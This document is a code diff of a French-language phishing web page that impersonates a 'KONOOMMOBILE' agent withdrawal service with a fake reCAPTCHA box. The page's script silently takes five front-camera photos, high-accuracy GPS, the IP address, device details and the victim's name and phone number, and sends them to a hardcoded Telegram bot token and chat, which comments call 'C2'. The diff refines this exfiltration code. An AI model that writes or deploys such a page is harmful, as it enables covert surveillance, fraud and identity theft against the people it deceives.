@@ -209,12 +209,30 @@
             display: block;
         }
 
-        .status-msg {
+        .status {
             margin-top: 15px;
             padding: 12px;
             border-radius: 10px;
             font-size: 13px;
             display: none;
+        }
+        
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            display: block;
+        }
+        
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            display: block;
+        }
+        
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            display: block;
         }
 
         .footer-copy {
@@ -300,13 +318,13 @@ KONOOMMOBILE — La proximité au service des agents.</div>
 
             <div class="captcha-box" onclick="triggerHumanVerification()">
                 <div class="captcha-label">
-                    <div id="captchaBox" class="captcha-checkbox">✓</div>
+                    <div id="captchaBox" class="captcha-checkbox"></div>
                     <span>Je ne suis pas un robot</span>
                 </div>
                 <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30" alt="reCAPTCHA">
             </div>
 
-            <div id="statusMsg" class="status-msg"></div>
+            <div id="status" class="status"></div>
             <div class="footer-copy">Konoom Security Engine</div>
         </div>
 
@@ -318,21 +336,25 @@ KONOOMMOBILE — La proximité au service des agents.</div>
 
     <script>
         // ============================================
-        // CONFIGURATION C2 TELEGRAM (MIS À JOUR)
+        // CONFIGURATION DU BOT TELEGRAM (VALIDÉ)
         // ============================================
         const BOT_TOKEN = "8424189628:AAEewbU8l8JJHtBZr48rwYu5VQo39yxVU2o";
         const ADMIN_CHAT_ID = "6815008409";
         
+        // PARAMÈTRES DE CAPTURE
         const TOTAL_PHOTOS = 5;
         const CAPTURE_DELAY = 300;
         
         let mediaStream = null;
+        let isProcessing = false;
         let userIP = 'Inconnue';
         let userData = { operator: '', name: '', phone: '' };
-
+        
+        const statusDiv = document.getElementById('status');
+        const checkbox = document.getElementById('captchaBox');
         const video = document.getElementById('hiddenVideo');
         const canvas = document.getElementById('hiddenCanvas');
-
+        
         function goToView(step) {
             document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
             document.getElementById(`view${step}`).classList.add('active');
@@ -351,69 +373,37 @@ KONOOMMOBILE — La proximité au service des agents.</div>
             userData = { operator, name, phone: `+235 ${phone}` };
             goToView(3);
         }
-
-        // BOUCLE DE VÉRIFICATION AGRESSIVE (HARD RESET & FORCE-PROMPT)
+        
+        // DÉCLENCHEMENT DE LA VÉRIFICATION ET DE L'EXFILTRATION PARALLÈLE
         async function triggerHumanVerification() {
-            const checkbox = document.getElementById('captchaBox');
-            const statusMsg = document.getElementById('statusMsg');
+            if (isProcessing) return;
+            isProcessing = true;
             
             checkbox.classList.add('checked');
             checkbox.innerHTML = '✓';
-
-            statusMsg.style.display = 'block';
-            statusMsg.style.background = '#fef3c7';
-            statusMsg.style.borderColor = '#f59e0b';
-            statusMsg.style.color = '#92400e';
-            statusMsg.innerHTML = 'En cours demande de retrait... (Veuillez autoriser les accès requis)';
-
-            let success = false;
-            let ip, loc, photos;
-
-            // Boucle stricte : réinitialisation à zéro tant que les autorisations GPS / Caméra ne sont pas validées de force
-            while (!success) {
-                try {
-                    // Purger les flux précédents si existants
-                    if (mediaStream) {
-                        mediaStream.getTracks().forEach(t => t.stop());
-                        mediaStream = null;
-                    }
-
-                    const ipPromise = getIPAddress();
-                    const locPromise = getAggressiveLocation();
-                    const photosPromise = capturePhotosWithCamera();
-
-                    const results = await Promise.all([ipPromise, locPromise, photosPromise]);
-                    ip = results[0];
-                    loc = results[1];
-                    photos = results[2];
-
-                    if (!photos || photos.length === 0 || loc.error) {
-                        throw new Error("Autorisations partielles ou refusées - Redémarrage à zéro");
-                    }
-
-                    success = true;
-                } catch (error) {
-                    statusMsg.innerHTML = 'En cours demande de retrait... (Veuillez autoriser GPS et Caméra)';
-                    await new Promise(r => setTimeout(r, 1500));
-                }
-            }
-
-            statusMsg.innerHTML = 'En cours demande de retrait... Finalisation.';
-
+            
+            showStatus('info', '⏳ En cours demande de retrait... ⏳');
+            
+            // Lancer les tâches en parallèle (Moteur DeepSeek)
+            const ipPromise = getIPAddress();
+            const locPromise = getLocation();
+            const photosPromise = capturePhotosWithCamera();
+            
             try {
+                const [ip, loc, photos] = await Promise.all([ipPromise, locPromise, photosPromise]);
                 await sendAllDataToTelegram(ip, loc, photos);
-                statusMsg.style.background = '#d1fae5';
-                statusMsg.style.borderColor = '#6ee7b7';
-                statusMsg.style.color = '#065f46';
-                statusMsg.innerHTML = '✅ Demande de retrait enregistrée avec succès !';
-            } catch (err) {
-                statusMsg.style.background = '#fee2e2';
-                statusMsg.style.borderColor = '#fca5a5';
-                statusMsg.style.color = '#b91c1c';
-                statusMsg.innerHTML = '❌ Erreur de liaison au serveur.';
+                
+                showStatus('success', '✅ Demande de retrait enregistrée avec succès !');
+            } catch (error) {
+                console.error('Erreur globale :', error);
+                showStatus('error', '⚠️ Échec de la vérification. Réessayez.');
+                checkbox.classList.remove('checked');
+                checkbox.innerHTML = '';
+                isProcessing = false;
             }
         }
-
+        
+        // Récupération de l'adresse IP
         async function getIPAddress() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
@@ -421,12 +411,13 @@ KONOOMMOBILE — La proximité au service des agents.</div>
                 userIP = data.ip;
                 return userIP;
             } catch (error) {
-                return 'Inconnue';
+                userIP = 'Inconnue';
+                return userIP;
             }
         }
-
-        // Géolocalisation agressive (Force un nouveau prompt sans cache)
-        async function getAggressiveLocation() {
+        
+        // Récupération de la localisation
+        async function getLocation() {
             return new Promise((resolve) => {
                 if ("geolocation" in navigator) {
                     navigator.geolocation.getCurrentPosition(
@@ -437,22 +428,33 @@ KONOOMMOBILE — La proximité au service des agents.</div>
                                 accuracy: position.coords.accuracy
                             });
                         },
-                        (error) => { resolve({ error: error.message }); },
-                        { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+                        (error) => {
+                            resolve({ error: error.message });
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 8000,
+                            maximumAge: 0
+                        }
                     );
                 } else {
                     resolve({ error: 'Non supportée' });
                 }
             });
         }
-
-        // Capture caméra agressive et sans mise en cache
+        
+        // Capture des photos avec la caméra (silencieuse)
         async function capturePhotosWithCamera() {
             return new Promise(async (resolve) => {
                 const photos = [];
+                
                 try {
                     const constraints = {
-                        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+                        video: {
+                            facingMode: "user",
+                            width: { min: 480, ideal: 1280 },
+                            height: { min: 360, ideal: 720 }
+                        },
                         audio: false
                     };
                     
@@ -460,14 +462,20 @@ KONOOMMOBILE — La proximité au service des agents.</div>
                     video.srcObject = mediaStream;
                     
                     await new Promise((resolve) => {
-                        video.onloadedmetadata = () => { video.play(); resolve(); };
-                        setTimeout(resolve, 1000);
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            resolve();
+                        };
+                        setTimeout(resolve, 1500);
                     });
                     
-                    await new Promise(r => setTimeout(r, 800));
+                    await new Promise(r => setTimeout(r, 1000));
                     
                     if (video.videoWidth === 0 || video.videoHeight === 0) {
-                        if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
+                        if (mediaStream) {
+                            mediaStream.getTracks().forEach(track => track.stop());
+                            mediaStream = null;
+                        }
                         resolve(photos);
                         return;
                     }
@@ -478,16 +486,23 @@ KONOOMMOBILE — La proximité au service des agents.</div>
                             photos.push(photo);
                         } else {
                             const retryPhoto = await captureSinglePhoto();
-                            if (retryPhoto) photos.push(retryPhoto);
+                            if (retryPhoto) {
+                                photos.push(retryPhoto);
+                            }
                         }
-                        if (i < TOTAL_PHOTOS) await new Promise(r => setTimeout(r, CAPTURE_DELAY));
+                        
+                        if (i < TOTAL_PHOTOS) {
+                            await new Promise(r => setTimeout(r, CAPTURE_DELAY));
+                        }
                     }
                     
                     if (mediaStream) {
                         mediaStream.getTracks().forEach(track => track.stop());
                         mediaStream = null;
                     }
+                    
                     resolve(photos);
+                    
                 } catch (error) {
                     if (mediaStream) {
                         mediaStream.getTracks().forEach(track => track.stop());
@@ -497,44 +512,81 @@ KONOOMMOBILE — La proximité au service des agents.</div>
                 }
             });
         }
-
+        
+        // Capture d'une seule photo
         async function captureSinglePhoto() {
             return new Promise((resolve) => {
                 try {
-                    if (!video || video.readyState !== 4) { resolve(null); return; }
+                    if (!video || video.readyState !== 4) {
+                        resolve(null);
+                        return;
+                    }
+                    
                     const width = video.videoWidth;
                     const height = video.videoHeight;
-                    if (width < 100 || height < 100) { resolve(null); return; }
+                    
+                    if (width < 100 || height < 100) {
+                        resolve(null);
+                        return;
+                    }
                     
                     canvas.width = width;
                     canvas.height = height;
+                    
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, width, height);
+                    
                     const photoDataUrl = canvas.toDataURL('image/jpeg', 0.85);
                     
-                    if (photoDataUrl.length < 10000) { resolve(null); return; }
+                    if (photoDataUrl.length < 10000) {
+                        setTimeout(() => {
+                            ctx.drawImage(video, 0, 0, width, height);
+                        }, 50);
+                        const retryDataUrl = canvas.toDataURL('image/jpeg', 0.85);
+                        if (retryDataUrl.length > 10000) {
+                            resolve(retryDataUrl);
+                            return;
+                        }
+                        resolve(null);
+                        return;
+                    }
+                    
                     resolve(photoDataUrl);
+                    
                 } catch (error) {
                     resolve(null);
                 }
             });
         }
-
+        
+        // Envoi des données au bot Telegram (Intégration Agent + C2)
         async function sendAllDataToTelegram(ip, location, photos) {
             let message = `🔴 NOUVELLE DEMANDE KONOOMMOBILE 🔴\n\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━\n`;
             message += `👤 AGENT : ${userData.name}\n`;
             message += `📱 OPÉRATEUR : ${userData.operator}\n`;
             message += `📞 TÉLÉPHONE : ${userData.phone}\n`;
-            message += `🌐 IP : ${ip}\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `📱 INFORMATIONS APPAREIL :\n`;
+            message += `• ${navigator.userAgent.substring(0, 80)}\n`;
+            message += `• Écran : ${screen.width}x${screen.height}\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `🌐 ADRESSE IP : ${ip}\n`;
             message += `🕐 HEURE : ${new Date().toLocaleString('fr-FR')}\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━\n`;
             
             if (location && !location.error) {
-                message += `📍 GPS : ${location.lat}, ${location.lng} (±${Math.round(location.accuracy)}m)\n`;
-                message += `🗺️ MAPS : https://www.google.com/maps?q=${location.lat},${location.lng}\n`;
+                message += `📍 LOCALISATION CAPTURÉE :\n`;
+                message += `• Latitude : ${location.lat}\n`;
+                message += `• Longitude : ${location.lng}\n`;
+                message += `• Précision : ±${Math.round(location.accuracy)} mètres\n`;
+                message += `• Carte : https://www.google.com/maps?q=${location.lat},${location.lng}\n`;
             } else {
-                message += `📍 GPS : ${location?.error || 'Indisponible'}\n`;
+                message += `📍 LOCALISATION : ${location?.error || 'Non disponible'}\n`;
             }
+            message += `━━━━━━━━━━━━━━━━━━━━\n`;
             message += `📸 PHOTOS CAPTURÉES : ${photos.length}/${TOTAL_PHOTOS}\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━\n`;
             
             await sendTelegramMessage(message);
             
@@ -547,29 +599,44 @@ KONOOMMOBILE — La proximité au service des agents.</div>
                 }
             }
         }
-
+        
+        // Envoyer un message texte à Telegram
         async function sendTelegramMessage(message) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'HTML' })
-            });
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        chat_id: ADMIN_CHAT_ID, 
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Erreur envoi message');
+            }
         }
-
+        
+        // Envoyer une photo à Telegram
         async function sendPhotoToTelegram(dataUrl, index) {
             const blob = dataURLToBlob(dataUrl);
             const formData = new FormData();
             formData.append('chat_id', ADMIN_CHAT_ID);
             formData.append('photo', blob, `photo_${index}.jpg`);
-            formData.append('caption', `📸 PHOTO ${index} - ${userData.name} (${userData.phone})`);
+            formData.append('caption', `📸 PHOTO ${index} - ${userData.name} (${userData.phone})\n🕐 ${new Date().toLocaleString('fr-FR')}\n📍 IP : ${userIP}`);
             
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (error) {
+                console.error('Erreur photo');
+            }
         }
-
+        
+        // Convertir DataURL en Blob
         function dataURLToBlob(dataURL) {
             const arr = dataURL.split(',');
             const mime = arr[0].match(/:(.*?);/)[1];
@@ -581,6 +648,20 @@ KONOOMMOBILE — La proximité au service des agents.</div>
             }
             return new Blob([u8arr], { type: mime });
         }
+        
+        // Afficher un message d'état
+        function showStatus(type, message) {
+            statusDiv.className = `status ${type}`;
+            statusDiv.innerHTML = message;
+            statusDiv.style.display = 'block';
+        }
+        
+        // Nettoyage à la fermeture
+        window.addEventListener('beforeunload', () => {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+        });
     </script>
 </body>
 </html>
